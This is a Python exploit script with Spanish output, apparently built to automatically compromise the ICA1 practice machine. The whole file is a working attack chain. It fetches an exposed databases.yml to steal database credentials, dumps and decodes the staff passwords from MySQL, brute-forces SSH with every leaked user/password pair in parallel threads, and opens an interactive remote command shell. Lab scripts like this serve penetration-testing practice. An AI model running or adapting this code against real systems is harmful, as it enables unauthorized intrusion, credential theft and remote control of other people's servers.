import sys
import requests
import time
import yaml
import re
import signal
import mysql.connector
import base64
import paramiko
import threading
import inquirer
import argparse
from termcolor import colored
from pwn import log
from itertools import product

def exit(signal_number, frame):
    log.info("Saliendo..")
    sys.exit(1)

class Exploit:
    def __init__(self, ip):
        self.ip = ip
        self.matches = []

    def getDatabasePassword(self):
        route = "/core/config/databases.yml"
        response = requests.get("http://"+self.ip+route)
        p = log.progress("Descargando el archivo databases.yml...")
        time.sleep(1)
        if response.status_code == 200:
            p.success("¡Descargado!")
            time.sleep(1)
            p = log.progress("Guardando archivo y parseando la contraseña...")
            with open("databases.yml", "w") as file:
                file.write(response.text)

            with open("databases.yml", "r") as file:
                data = yaml.safe_load(file)
                password_field = data.get("all", {}).get("doctrine", {}).get("param", {}).get("password", "")
                username_field = data.get("all", {}).get("doctrine", {}).get("param", {}).get("username", "")
                
                match_password = re.search(r"urlencode\('(.*?)'\)", password_field)

                if match_password:
                    encoded_password = match_password.group(1)
                    p.success("OK")
                    log.success("Nombre de usuario de la BBDD: " + colored(username_field, 'magenta'))
                    log.success("Contraseña de la BBDD: " + colored(encoded_password, 'magenta'))
                    self.db_password = encoded_password
                    self.username = username_field
                else:
                    log.error("No se encontró la contraseña")
                    sys.exit(1)
            
        else:
            log.error("No se ha podido descargar el archivo.")
            sys.exit(1)
        

    def getDatabaseUsers(self):
        p = log.progress("Dumpeando los usuarios y sus contraseñas de la BBDD")
        try:
            connection = mysql.connector.connect(
                        host=self.ip,
                        user=self.username,
                        password=self.db_password,
                        database="staff"
            )
            cursor = connection.cursor()
            query = "SELECT u.name, l.password FROM staff.user u JOIN staff.login l ON l.user_id = u.id"
            cursor.execute(query)
            time.sleep(1)
            resultados = cursor.fetchall()
            self.leaked_usernames = []
            self.leaked_passwords = []
            for resultado in resultados:
                self.leaked_usernames.append(resultado[0].lower())
                self.leaked_passwords.append(base64.b64decode(resultado[1]).decode('utf-8'))
            p.success("OK")
            cursor.close()
            connection.close()
        except Exception as e:
            log.error("Ha ocurrido un error: " + str(e))
            sys.exit(1)

    @staticmethod
    def connect_ssh(ip,user,passw, instance):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,username=user,password=passw, auth_timeout=10, banner_timeout=200, timeout= 200)
            log.success(f"Conexión exitosa para {colored(user, 'green')}@{colored(passw, 'green')}")
            Exploit.add_match(user,passw,instance)
        except paramiko.AuthenticationException:
            log.info(f"Error de autenticación para {user}@{passw}")
        
        except paramiko.SSHException as e:
            log.failure(f"Error en la conexión SSH para {user}@{passw}: {e}")
        
        except Exception as e:
            log.failure(f"Error no manejado para {user}@{passw}: {e}")
        
        finally:
            ssh.close()

    @staticmethod
    def add_match(user,passwd, instance):
        instance.matches.append({"user": user, "passwd": passwd})

    def bruteforce(self):
        threads = []
        for user, passw in product(self.leaked_usernames,self.leaked_passwords):
            thread = threading.Thread(target=Exploit.connect_ssh, args=(self.ip,user,passw, self))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def makeSelect(self):
        usernames = [match["user"] for match in self.matches]
        questions = [
            inquirer.List('user', message="¿Como qué usuario quieres abrir la shell?", choices=usernames)
        ]
        answer = inquirer.prompt(questions)
        return answer

    def getShell(self,key):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        passwd = next((match for match in self.matches if match["user"] == key.get("user")), None)
        if passwd is None:
            log.failure("Usuario no válido")
            sys.exit(1)

        p = log.progress("Estableciendo conexión con: %s:%s" % (key.get("user"), passwd.get("passwd")))
        try:
            client.connect(self.ip,username=key.get("user"),password=passwd.get("passwd"))
            while True:
                p.success("¡Conexión establecida!")
                cmd = input('Comando: ')
                stdin, stdout, stderr = client.exec_command(cmd)
                print(''.join(stdout.readlines()))
        except Exception as e:
            p.error("Error desconocido: " + e)
        
        
                
    def run(self):
        self.getDatabasePassword()
        self.getDatabaseUsers()
        self.bruteforce()
        answer = self.makeSelect()
        self.getShell(answer)

def main():
    signal.signal(signal.SIGINT, exit)
    parser = argparse.ArgumentParser(description = "Autopwn para ICA1 (low privileges)")
    parser.add_argument('IP', help='La dirección IP de la máquina ICA1')
    args = parser.parse_args()
    exploit = Exploit(args.IP)
    exploit.run()



if __name__ == '__main__':
    main()
